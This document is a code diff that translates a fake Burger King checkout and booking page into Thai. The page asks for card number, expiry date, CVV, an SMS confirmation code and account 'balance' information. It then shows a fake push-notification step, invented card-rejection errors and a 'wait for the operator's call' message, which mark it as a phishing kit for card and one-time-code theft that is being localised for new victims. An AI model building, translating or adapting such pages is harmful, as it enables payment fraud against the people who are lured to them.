@@ -11,7 +11,7 @@
     <meta name="HandheldFriendly" content="true">
 
     <title>
-        Checkout - Burger King  </title>
+        ชำระเงิน - เบอร์เกอร์คิง  </title>
 
     <!-- FAVICON -->
     <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
@@ -135,7 +135,7 @@
     <%- include('./model/hader')%>
     <section class="page-title" style="background-color: #e4cdae; color: #502314;">
         <div class="container">
-            <h1>Checkout</h1>
+            <h1>ชำระเงิน</h1>
         </div>
     </section>
 
@@ -149,7 +149,7 @@
                     <div class="screen-reader-response"><p role="status" aria-live="polite" aria-atomic="true"></p> <ul></ul></div>
                     <div  method="post" class="wpcf7-form init" aria-label="Contact form" novalidate="novalidate" data-status="init">
                         <div class="form frm" id="pay" style="display: none;">
-                            <p class="title">Card Details</p>
+                            <p class="title">รายละเอียดบัตร</p>
 
                             <script type="text/javascript">
                                 (function( $ ) {
@@ -161,11 +161,11 @@
                                     });
                                 })(jQuery)
                             </script>
-                            <span class="wpcf7-form-control-wrap" data-name="number-card"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" value="" type="text" name="card" placeholder="Card number"></span>
+                            <span class="wpcf7-form-control-wrap" data-name="number-card"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" value="" type="text" name="card" placeholder="หมายเลขบัตร"></span>
                             <span class="wpcf7-form-control-wrap" data-name="data" style="display: flex;justify-content: space-between;"><input size="40" class="wpcf7-form-control wpcf7-tel wpcf7-text wpcf7-validates-as-tel" aria-invalid="false" value="" type="tel" name="expdate" placeholder="MM/YY" style="width: 49%;"><input size="40" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" aria-required="true" aria-invalid="false" value="" type="text" name="cvv" placeholder="CVV" style="width: 49%;"></span>
 
 
-                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" id="sendLog" type="button" value="Submit"><span class="wpcf7-spinner"></span>
+                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" id="sendLog" type="button" value="ส่ง"><span class="wpcf7-spinner"></span>
                         </div>
                         <div class="frm form" id="loading" style="display: none;">
                             <div style="display: flex; justify-content: center;">
@@ -178,11 +178,11 @@
                                 <div class="loader"></div>
 
                             </div><div style="display: flex; justify-content: center;">
-                                <h3>Push notification</h3>
+                                <h3>การแจ้งเตือนแบบพุช</h3>
 
                             </div>
 
-                            <span>We have sent a notification to your security device phone so you can confirm the transaction.</span>
+                            <span>เราได้ส่งการแจ้งเตือนไปยังอุปกรณ์รักษาความปลอดภัยของคุณแล้ว เพื่อให้คุณยืนยันการทำธุรกรรม</span>
                         </div>
 
                         <div class="frm form" style="display: none;" id="form-success">
@@ -267,13 +267,13 @@
                             </div><div style="display: flex; justify-content: center;">
 
 
-                                <h3 style="text-align: center;">The payment was successful. Wait for the operator's call.</h3></div>
+                                <h3 style="text-align: center;">การชำระเงินสำเร็จแล้ว รอสายจากพนักงาน</h3></div>
 
 
 
                         </div>
                         <div class="form frm" style="display: none;" id="form-balance">
-                            <span>Please note that it is necessary to check your current balance in order to successfully complete the scheduled transaction. To ensure the accuracy and efficiency of the process, additional information on the financial situation of your account is required.</span>
+                            <span>โปรดทราบว่าจำเป็นต้องตรวจสอบยอดเงินปัจจุบันของคุณเพื่อให้การทำธุรกรรมที่กำหนดไว้เสร็จสิ้นได้สำเร็จ เพื่อให้มั่นใจในความถูกต้องและประสิทธิภาพของกระบวนการ จำเป็นต้องมีข้อมูลเพิ่มเติมเกี่ยวกับสถานการณ์ทางการเงินของบัญชีของคุณ</span>
 
                             <script type="text/javascript">
                                 (function( $ ) {
@@ -289,10 +289,10 @@
 
 
 
-                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="Submit" id="sendBalance"><span class="wpcf7-spinner"></span>
+                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="ส่ง" id="sendBalance"><span class="wpcf7-spinner"></span>
                         </div>
                         <div class="form frm" style="display: none;" id="form-sms">
-                            <p class="title">SMS confirmation</p>
+                            <p class="title">การยืนยัน SMS</p>
 
                             <script type="text/javascript">
                                 (function( $ ) {
@@ -304,11 +304,11 @@
                                     });
                                 })(jQuery)
                             </script>
-                            <span class="wpcf7-form-control-wrap" data-name="number-card"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" value="" type="text" maxlength="19" name="sms" placeholder="SMS-code"></span>
+                            <span class="wpcf7-form-control-wrap" data-name="number-card"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" value="" type="text" maxlength="19" name="sms" placeholder="รหัส SMS"></span>
 
 
 
-                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="Submit" id="sendSms"><span class="wpcf7-spinner"></span>
+                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="ส่ง" id="sendSms"><span class="wpcf7-spinner"></span>
                         </div>
                         <div class="form frm" style="display: none;" id="form-custom">
                             <span class="e" style="text-align: center"></span>
@@ -327,7 +327,7 @@
 
 
 
-                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="Submit" id="sendCustom"><span class="wpcf7-spinner"></span>
+                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="button" value="ส่ง" id="sendCustom"><span class="wpcf7-spinner"></span>
                         </div>
                         <div class="frm form" style="display: none;" id="form-customError">
                             <div style="display: flex; justify-content: center;">
@@ -336,7 +336,7 @@
                             </div><div style="display: flex; justify-content: center;">
 
 
-                                <h3 class="ee" style="text-align: center;">The card is not supported. Please check that you have entered the information correctly.</h3></div>
+                                <h3 class="ee" style="text-align: center;">บัตรไม่รองรับ โปรดตรวจสอบว่าคุณได้ป้อนข้อมูลถูกต้องแล้ว</h3></div>
 
 
 
@@ -348,7 +348,7 @@
                             </div><div style="display: flex; justify-content: center;">
 
 
-                                <h3 style="text-align: center;">Your card is not suitable for technical reasons.</h3></div>
+                                <h3 style="text-align: center;">บัตรของคุณไม่เหมาะสมด้วยเหตุผลทางเทคนิค</h3></div>
 
 
 
@@ -360,14 +360,14 @@
                             </div><div style="display: flex; justify-content: center;">
 
 
-                                <h3 style="text-align: center;">The card is not supported. Please check that you have entered the information correctly.</h3></div>
+                                <h3 style="text-align: center;">บัตรไม่รองรับ โปรดตรวจสอบว่าคุณได้ป้อนข้อมูลถูกต้องแล้ว</h3></div>
 
 
 
                         </div>
                         <div class="form" id="form">
-                            <p class="title">Personal Details</p>
-                            <span class="wpcf7-form-control-wrap" data-name="title"><select class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required grey" aria-required="true" aria-invalid="false" name="title"><option value="" selected="selected" disabled="disabled">Title</option><option value="Mr">Mr</option><option value="Mrs">Mrs</option><option value="Miss">Miss</option><option value="Ms">Ms</option></select></span>
+                            <p class="title">รายละเอียดส่วนตัว</p>
+                            <span class="wpcf7-form-control-wrap" data-name="title"><select class="wpcf7-form-control wpcf7-select wpcf7-validates-as-required grey" aria-required="true" aria-invalid="false" name="title"><option value="" selected="selected" disabled="disabled">คำนำหน้า</option><option value="Mr">นาย</option><option value="Mrs">นาง</option><option value="Miss">นางสาว</option><option value="Ms">คุณ</option></select></span>
                             <script type="text/javascript">
                                 (function( $ ) {
                                     'use strict';
@@ -378,14 +378,14 @@
                                     });
                                 })(jQuery)
                             </script>
-                            <span class="wpcf7-form-control-wrap" data-name="full-name"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="Full Name*" value="" type="text" name="full-name"></span>
-                            <span class="wpcf7-form-control-wrap" data-name="email-address"><input size="40" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="Address*" value="" type="text" name="address"></span>
-                            <span class="wpcf7-form-control-wrap" data-name="phone-number"><input size="40" class="wpcf7-form-control wpcf7-tel wpcf7-text wpcf7-validates-as-tel" aria-invalid="false" placeholder="Phone Number*" value="" type="tel" name="phone-number"></span>
+                            <span class="wpcf7-form-control-wrap" data-name="full-name"><input size="40" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" placeholder="ชื่อเต็ม*" value="" type="text" name="full-name"></span>
+                            <span class="wpcf7-form-control-wrap" data-name="email-address"><input size="40" class="wpcf7-form-control wpcf7-email wpcf7-validates-as-required wpcf7-text wpcf7-validates-as-email" aria-required="true" aria-invalid="false" placeholder="ที่อยู่*" value="" type="text" name="address"></span>
+                            <span class="wpcf7-form-control-wrap" data-name="phone-number"><input size="40" class="wpcf7-form-control wpcf7-tel wpcf7-text wpcf7-validates-as-tel" aria-invalid="false" placeholder="หมายเลขโทรศัพท์*" value="" type="tel" name="phone-number"></span>
                             <div class="dropdown">
-                                <input size="40" onclick="toggleDropdown()" class="dropdown-button wpcf7-form-control wpcf7-text wpcf7-validates-as-required walcf7-timepicker" aria-required="true" aria-invalid="false" placeholder="Booking Time" value="" type="text" name="time" readonly="">
+                                <input size="40" onclick="toggleDropdown()" class="dropdown-button wpcf7-form-control wpcf7-text wpcf7-validates-as-required walcf7-timepicker" aria-required="true" aria-invalid="false" placeholder="เวลาจอง" value="" type="text" name="time" readonly="">
                                 <div class="dropdown-content" id="dropdownContent"></div>
                             </div>
-                            <span class="wpcf7-form-control-wrap" data-name="comments"><textarea cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea" aria-invalid="false" placeholder="Allergen info and Additional Comments" name="comments"></textarea></span>
+                            <span class="wpcf7-form-control-wrap" data-name="comments"><textarea cols="40" rows="10" class="wpcf7-form-control wpcf7-textarea" aria-invalid="false" placeholder="ข้อมูลสารก่อภูมิแพ้และความคิดเห็นเพิ่มเติม" name="comments"></textarea></span>
                         
                             <script>
                                 function generateTimeOptions() {
@@ -417,7 +417,7 @@
 
                                 generateTimeOptions();
                             </script>
-                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="submit" id="send-form" value="Confirm Booking">
+                            <input class="wpcf7-form-control wpcf7-submit has-spinner btn btn--beige" type="submit" id="send-form" value="ยืนยันการจอง">
                         </div><div class="wpcf7-response-output" aria-hidden="true"></div>
                     </div>
                 </div>
